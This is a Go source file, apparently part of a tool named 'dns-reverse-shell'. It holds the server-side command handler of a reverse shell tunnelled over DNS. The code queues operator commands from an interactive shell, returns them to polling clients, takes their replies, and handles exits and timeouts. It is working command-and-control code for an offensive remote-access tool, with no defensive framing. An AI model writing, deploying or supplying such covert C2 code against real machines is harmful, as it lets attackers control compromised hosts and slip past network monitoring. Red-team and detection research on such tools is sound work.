package server

import (
	"dns-reverse-shell/main/shell"
	"fmt"
	"github.com/golang-collections/collections/queue"
)

type serverCommandHandler struct {
	shell           *shell.Shell
	queue           *queue.Queue
	timeoutExecutor *timeoutExecutor
}

func newServerCommandHandler() *serverCommandHandler {
	handler := serverCommandHandler{queue: queue.New()}
	handler.timeoutExecutor = newTimeoutExecutor()
	return &handler
}

func (c *serverCommandHandler) init() {
	c.shell = shell.NewShell(c.queueCommand)
	c.shell.Start()
}

func (c *serverCommandHandler) queueCommand(command string) {
	c.queue.Enqueue(command)
}

func (c *serverCommandHandler) HandleCommand(value string, pollCallback func(), answerCallback func(string), exitCallback func()) {
	c.resetTimeout(exitCallback)
	switch value {
	case "poll.":
		if c.queue.Len() == 0 {
			c.Poll(pollCallback)
		} else {
			c.Answer(c.queue.Dequeue().(string), answerCallback)
		}
	case "answer.":
		c.Answer("ok", answerCallback)
		c.shell.Resume()
		break
	case "exit.":
		c.Exit(exitCallback)
		break
	default:
		panic("Request value '" + value + "' unknown.")
	}
}

func (c *serverCommandHandler) Poll(pollCallback func()) {
	pollCallback()
}

func (c *serverCommandHandler) Answer(value string, answerCallback func(string)) {
	answerCallback(value)
}

func (c *serverCommandHandler) Exit(exitCallback func()) {
	exitCallback()
	fmt.Println("Connection closed")
	c.timeoutExecutor.exit()
	c.shell.Start()
}

func (c *serverCommandHandler) Default(defaultCallback func(string)) {
	defaultCallback(c.queue.Dequeue().(string))
}

func (c *serverCommandHandler) resetTimeout(exitCallback func()) {
	c.timeoutExecutor.reset()
	c.timeoutExecutor.callback = func() {
		c.Exit(exitCallback)
	}
}

func (c *serverCommandHandler) initTimeout() {
	go c.timeoutExecutor.start()
}
